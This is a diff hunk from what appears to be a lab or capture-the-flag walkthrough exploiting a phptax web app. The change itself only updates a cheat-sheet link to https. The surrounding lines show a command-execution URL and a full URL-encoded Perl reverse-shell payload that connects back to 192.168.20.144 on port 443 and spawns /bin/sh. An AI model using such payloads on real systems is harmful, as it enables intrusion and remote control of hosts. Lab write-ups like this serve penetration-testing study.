@@ -476,7 +476,7 @@ http://192.168.20.148:8080/phptax/data/rce.php?cmd=id
 ### Low Privilege Shell
 
 Exploiting remote command execution using [perl reverse
-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
+shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
 
 ```
 http://192.168.20.148:8080/phptax/data/rce.php?cmd=perl+-e+%27use+Socket%3B%24i%3D%22192.168.20.144%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%27
